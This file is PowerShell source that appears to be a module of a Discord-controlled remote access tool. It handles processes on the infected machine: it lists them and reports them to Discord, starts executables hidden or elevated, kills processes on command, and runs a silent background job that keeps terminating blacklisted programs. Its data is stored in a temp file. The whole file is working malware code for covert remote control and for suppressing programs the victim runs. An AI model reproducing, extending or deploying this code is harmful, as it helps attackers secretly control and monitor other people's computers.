# Global variables for process management - with persistence check
if (-not $global:ProcessBlacklist) { $global:ProcessBlacklist = @() }
if (-not $global:ProcessMonitoringEnabled) { $global:ProcessMonitoringEnabled = $false }
if (-not $global:ProcessMonitorJob) { $global:ProcessMonitorJob = $null }

#==================================== PERSISTENCE FUNCTIONS ====================================

function MSave_ProcessLists {
    $dataPath = "$env:TEMP\ProcessManagement_Data.json"
    $data = @{
        Blacklist = $global:ProcessBlacklist
        LastSaved = Get-Date
    }
    $data | ConvertTo-Json | Out-File -FilePath $dataPath -Encoding UTF8
    sendEmbedWithImage -Title "Process Management" -Description ":floppy_disk: **Process blacklist saved**"
}

function MLoad_ProcessLists {
    $dataPath = "$env:TEMP\ProcessManagement_Data.json"
    if (Test-Path $dataPath) {
        $data = Get-Content -Path $dataPath -Raw | ConvertFrom-Json
        $global:ProcessBlacklist = $data.Blacklist
        sendEmbedWithImage -Title "Process Management" -Description ":open_file_folder: **Process blacklist loaded**`n`n**Blacklist items:** $($global:ProcessBlacklist.Count)" 
    } else {
        sendEmbedWithImage -Title "Process Management" -Description ":warning: **No saved data found**"
    }
}

# Auto-load on module initialization
$dataPath = "$env:TEMP\ProcessManagement_Data.json"
if (Test-Path $dataPath) {
    $data = Get-Content -Path $dataPath -Raw | ConvertFrom-Json
    if ($data.Blacklist) { $global:ProcessBlacklist = $data.Blacklist }
}

#==================================== PROCESS LISTING ====================================

function MGet_ProcessList {
    param(
        [string]$filter = "",
        [string]$sortBy = "CPU"
    )
    
    $processes = Get-Process
    
    if ($filter) {
        $processes = $processes | Where-Object { $_.ProcessName -like "*$filter*" }
    }
    
    switch ($sortBy.ToLower()) {
        "cpu" { $processes = $processes | Sort-Object CPU -Descending }
        "memory" { $processes = $processes | Sort-Object WorkingSet -Descending }
        "name" { $processes = $processes | Sort-Object ProcessName }
        default { $processes = $processes | Sort-Object CPU -Descending }
    }
    
    $totalCount = $processes.Count
    
    # Create the process list output
    $output = ":gear: **Complete Process List** ($totalCount processes)`n"
    $output += "``````"
    $output += "{0,-25} {1,-8} {2,-12} {3,-10} {4,-15}`n" -f "Name", "PID", "Memory(MB)", "CPU", "Status"
    $output += "-" * 75 + "`n"
    
    $processes | ForEach-Object {
        $memoryMB = [math]::Round($_.WorkingSet / 1MB, 2)
        $cpuTime = if ($_.CPU) { [math]::Round($_.CPU, 2) } else { 0 }
        $status = if ($_.Responding) { "OK" } else { "Hung" }
        
        $output += "{0,-25} {1,-8} {2,-12} {3,-10} {4,-15}`n" -f $_.ProcessName, $_.Id, $memoryMB, $cpuTime, $status
    }
    $output += "``````"
    
    sendMsg -Message $output
}

#==================================== PROCESS EXECUTION ====================================

function MStart_Process {
    param(
        [string]$executablePath,
        [string]$arguments = "",
        [switch]$hidden,
        [switch]$elevated
    )
    
    if (-not $executablePath) {
        sendEmbedWithImage -Title "Process Management" -Description ":x: **Error:** Please specify executable path`n**Usage:** ``STARTPROCESS -executablePath 'C:\\Windows\\System32\\notepad.exe'``"
        return
    }
    
    if (-not (Test-Path $executablePath)) {
        sendEmbedWithImage -Title "Process Management" -Description ":x: **File not found:** $executablePath"
        return
    }
    
    # Check if process is in blacklist
    $fileName = [System.IO.Path]::GetFileNameWithoutExtension($executablePath)
    if ($global:ProcessBlacklist -contains $fileName) {
        sendEmbedWithImage -Title "Process Management" -Description ":no_entry: **Cannot start blacklisted process:** $fileName"
        return
    }
    
    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = $executablePath
    
    if ($arguments) {
        $startInfo.Arguments = $arguments
    }
    
    if ($hidden) {
        $startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $startInfo.CreateNoWindow = $true
    }
    
    if ($elevated) {
        $startInfo.Verb = "runas"
    }
    
    $process = [System.Diagnostics.Process]::Start($startInfo)
    
    if ($process) {
        sendEmbedWithImage -Title "Process Management" -Description ":rocket: **Started process:** $fileName (PID: $($process.Id))"
    } else {
        sendEmbedWithImage -Title "Process Management" -Description ":x: **Failed to start process:** $fileName"
    }
}

#==================================== BLACKLIST MANAGEMENT ====================================

function MAdd_ProcessBlacklist {
    param([string]$processName)
    
    if (-not $processName) {
        sendEmbedWithImage -Title "Process Management" -Description ":x: **Error:** Please specify process name`n**Usage:** ``ADDBLACKLIST -processName example``"
        return
    }
    
    if ($global:ProcessBlacklist -notcontains $processName) {
        $global:ProcessBlacklist += $processName
        MSave_ProcessLists
        sendEmbedWithImage -Title "Process Management" -Description ":no_entry: **Added to blacklist:** $processName"
    } else {
        sendEmbedWithImage -Title "Process Management" -Description ":information_source: **Already in blacklist:** $processName"
    }
}

function MRemove_ProcessBlacklist {
    param([string]$processName)
    
    if (-not $processName) {
        sendEmbedWithImage -Title "Process Management" -Description ":x: **Error:** Please specify process name`n**Usage:** ``REMOVEBLACKLIST -processName example``"
        return
    }
    
    if ($global:ProcessBlacklist -contains $processName) {
        $global:ProcessBlacklist = $global:ProcessBlacklist | Where-Object { $_ -ne $processName }
        MSave_ProcessLists
        sendEmbedWithImage -Title "Process Management" -Description ":no_entry: **Removed from blacklist:** $processName"
    } else {
        sendEmbedWithImage -Title "Process Management" -Description ":information_source: **Not in blacklist:** $processName"
    }
}

function MShow_ProcessBlacklist {
    if ($global:ProcessBlacklist.Count -eq 0) {
        sendEmbedWithImage -Title "Process Management" -Description ":no_entry: **Process Blacklist:** Empty"
    } else {
        $message = ":no_entry: **Process Blacklist:** ($($global:ProcessBlacklist.Count) items)`n"
        $global:ProcessBlacklist | ForEach-Object { $message += "• $_`n" }
        sendMsg -Message $message
        sendEmbedWithImage -Title "Process Management" -Description $message
    }
}

#==================================== PROCESS MONITORING ====================================

function MStart_ProcessMonitoring {
    param([int]$intervalSeconds = 5)
    
    if ($global:ProcessMonitoringEnabled) {
        sendEmbedWithImage -Title "Process Management" -Description ":information_source: **Process monitoring is already running**"
        return
    }
    
    if ($global:ProcessBlacklist.Count -eq 0) {
        sendEmbedWithImage -Title "Process Management" -Description ":warning: **No processes in blacklist.** Add some first with ``ADDBLACKLIST``"
        return
    }
    
    $global:ProcessMonitoringEnabled = $true
    
    sendEmbedWithImage -Title "Process Management" -Description ":hourglass_flowing_sand: **Starting process monitoring...**`n`n**Interval:** $intervalSeconds seconds`n**Mode:** Silent (only blacklisted processes will be terminated)"
    sendEmbedWithImage -Title "Process Management" -Description ":information_source: **Monitoring blacklisted processes:** $($global:ProcessBlacklist -join ', ')"

    $global:ProcessMonitorJob = Start-Job -ScriptBlock {
        param($token, $SessionID, $intervalSeconds, $blacklist)
        
        # Set up Discord communication variables
        $global:token = $token
        $global:SessionID = $SessionID
        
        # Import ALL necessary functions from the parent session
        ${function:sendMsg} = ${using:function:sendMsg}
        ${function:Send_SingleMessage} = ${using:function:Send_SingleMessage}
        ${function:Send_ChunkedMessage} = ${using:function:Send_ChunkedMessage}
        ${function:Send_AsFile} = ${using:function:Send_AsFile}
        ${function:Split_IntoChunks} = ${using:function:Split_IntoChunks}
        ${function:Clean_MessageContent} = ${using:function:Clean_MessageContent}
        ${function:Invoke-DiscordAPI} = ${using:function:Invoke-DiscordAPI}
        ${function:sendEmbedWithImage} = ${using:function:sendEmbedWithImage}
        
        $knownProcesses = @{}
        
        while ($true) {
            $currentProcesses = Get-Process
            
            foreach ($proc in $currentProcesses) {
                $procKey = "$($proc.ProcessName)_$($proc.Id)"
                
                # New process detected
                if (-not $knownProcesses.ContainsKey($procKey)) {
                    $knownProcesses[$procKey] = $proc
                    
                    # Check if blacklisted (using -like for pattern matching)
                    $isBlacklisted = $false
                    foreach ($blacklistedProcess in $blacklist) {
                        if ($proc.ProcessName -like $blacklistedProcess) {
                            $isBlacklisted = $true
                            break
                        }
                    }
                    
                    # ONLY send messages for blacklisted processes
                    if ($isBlacklisted) {
                        try {
                            $proc.Kill()
                            sendEmbedWithImage -Title "Process Management" -Description ":skull_crossbones: **BLACKLISTED PROCESS TERMINATED:** $($proc.ProcessName) (PID: $($proc.Id))"
                        } catch {
                            sendEmbedWithImage -Title "Process Management" -Description ":warning: **Failed to terminate blacklisted process:** $($proc.ProcessName) (PID: $($proc.Id)) - $($_.Exception.Message)"
                        }
                    }
                }
            }
            
            # Clean up terminated processes from tracking
            $currentPids = $currentProcesses | ForEach-Object { "$($_.ProcessName)_$($_.Id)" }
            $deadProcesses = $knownProcesses.Keys | Where-Object { $_ -notin $currentPids }
            foreach ($deadProc in $deadProcesses) {
                $knownProcesses.Remove($deadProc)
            }
            
            Start-Sleep -Seconds $intervalSeconds
        }
        
    } -ArgumentList $global:token, $global:SessionID, $intervalSeconds, $global:ProcessBlacklist
    
    # Wait for job to initialize
    Start-Sleep -Seconds 1
    
    sendEmbedWithImage -Title "Process Management" -Description ":eye: **Process monitoring started**`n`n**Interval:** $intervalSeconds seconds`n**Mode:** Silent (only blacklisted processes will be terminated)"
}

function MStop_ProcessMonitoring {
    if (-not $global:ProcessMonitoringEnabled) {
        sendEmbedWithImage -Title "Process Management" -Description ":information_source: **Process monitoring is not running**"
        return
    }
    
    $global:ProcessMonitoringEnabled = $false
    
    if ($global:ProcessMonitorJob) {
        Stop-Job -Job $global:ProcessMonitorJob -ErrorAction SilentlyContinue
        Remove-Job -Job $global:ProcessMonitorJob -ErrorAction SilentlyContinue
        $global:ProcessMonitorJob = $null
    }
    
    sendEmbedWithImage -Title "Process Management" -Description ":stop_sign: **Process monitoring stopped**"
}

function MGet_ProcessMonitoringStatus {
    if ($global:ProcessMonitoringEnabled -and $global:ProcessMonitorJob) {
        $job = $global:ProcessMonitorJob
        if ($job.State -eq "Running") {
            sendEmbedWithImage -Title "Process Management" -Description ":eye: **Process Monitoring Status:** Running (Job ID: $($job.Id)) - Silent mode"
            sendEmbedWithImage -Title "Process Management" -Description ":information_source: **Blacklisted processes:** $($global:ProcessBlacklist -join ', ')"
        } else {
            sendEmbedWithImage -Title "Process Management" -Description ":eye: **Process Monitoring Status:** Job exists but not running (State: $($job.State))"
        }
    } else {
        sendEmbedWithImage -Title "Process Management" -Description ":eye: **Process Monitoring Status:** Stopped"
    }
}

#==================================== PROCESS DETAILS ====================================

function MGet_ProcessDetails {
    param(
        [string]$processName = "",
        [int]$processId = 0
    )
    
    if (-not $processName -and $processId -eq 0) {
        sendEmbedWithImage -Title "Process Management" -Description ":x: **Error:** Please specify either process name or PID`n**Usage:** ``PROCESSDETAILS -processName notepad`` or ``PROCESSDETAILS -processId 1234``"
        return
    }
    
    $process = $null
    
    if ($processId -ne 0) {
        $process = Get-Process -Id $processId -ErrorAction SilentlyContinue
    } else {
        $processes = Get-Process -Name $processName -ErrorAction SilentlyContinue
        if ($processes.Count -gt 1) {
            $message = ":information_source: **Multiple processes found for '$processName':**`n"
            $processes | ForEach-Object { $message += "• $($_.ProcessName) (PID: $($_.Id))`n" }
            $message += "**Use PID for specific process details**"
            sendEmbedWithImage -Title "Process Management" -Description $message
            return
        } else {
            $process = $processes | Select-Object -First 1
        }
    }
    
    if (-not $process) {
        sendEmbedWithImage -Title "Process Management" -Description ":warning: **Process not found:** $processName (PID: $processId)"
        return
    }
    
    $memoryMB = [math]::Round($process.WorkingSet / 1MB, 2)
    $cpuTime = if ($process.CPU) { [math]::Round($process.CPU, 2) } else { "N/A" }
    $startTime = if ($process.StartTime) { $process.StartTime.ToString("yyyy-MM-dd HH:mm:ss") } else { "N/A" }
    
    $details = ":gear: **Process Details:**`n"
    $details += "**Name:** $($process.ProcessName)`n"
    $details += "**PID:** $($process.Id)`n"
    $details += "**Memory:** ${memoryMB} MB`n"
    $details += "**CPU Time:** $cpuTime seconds`n"
    $details += "**Start Time:** $startTime`n"
    $details += "**Responding:** $($process.Responding)`n"
    
    if ($process.MainModule) {
        $details += "**Path:** $($process.MainModule.FileName)`n"
        $details += "**Version:** $($process.MainModule.FileVersionInfo.FileVersion)`n"
    }
    
    sendEmbedWithImage -Title "Process Management" -Description $details
}

function MKill_Process {
    param(
        [string]$processName = "",
        [int]$processId = 0,
        [switch]$force
    )
    
    if (-not $processName -and $processId -eq 0) {
        sendEmbedWithImage -Title "Process Management" -Description ":x: **Error:** Please specify either process name or PID`n**Usage:** ``KILLPROCESS -processName notepad`` or ``KILLPROCESS -processId 1234``"
        return
    }
    
    $processes = @()
    
    if ($processId -ne 0) {
        $processes = Get-Process -Id $processId -ErrorAction SilentlyContinue
    } else {
        $processes = Get-Process -Name $processName -ErrorAction SilentlyContinue
    }
    
    if (-not $processes) {
        sendEmbedWithImage -Title "Process Management" -Description ":warning: **Process not found:** $processName (PID: $processId)"
        return
    }
    
    $killedProcesses = @()
    
    foreach ($proc in $processes) {
        try {
            if ($force) {
                $proc.Kill()
            } else {
                $proc.CloseMainWindow()
                Start-Sleep -Seconds 2
                if (-not $proc.HasExited) {
                    $proc.Kill()
                }
            }
            
            $killedProcesses += "$($proc.ProcessName) (PID: $($proc.Id))"
            
        } catch {
            sendEmbedWithImage -Title "Process Management" -Description ":x: **Failed to terminate:** $($proc.ProcessName) (PID: $($proc.Id)) - $($_.Exception.Message)"
        }
    }
    
    if ($killedProcesses.Count -gt 0) {
        $message = ":skull_crossbones: **Terminated processes:**`n"
        $killedProcesses | ForEach-Object { $message += "• $_`n" }
        sendEmbedWithImage -Title "Process Management" -Description $message
    }
}

function MProcMon_Cleanup {
    # STOP MONITORING
    MStop_ProcessMonitoring
    # DELETE THE .JSON
    if (Test-Path "$env:TEMP\ProcessManagement_Data.json") {
        Remove-Item "$env:TEMP\ProcessManagement_Data.json" -Force
    }
    sendEmbedWithImage -Title "Process Management" -Description ":wastebasket: **Cleaned up process management data and stopped monitoring**"
}

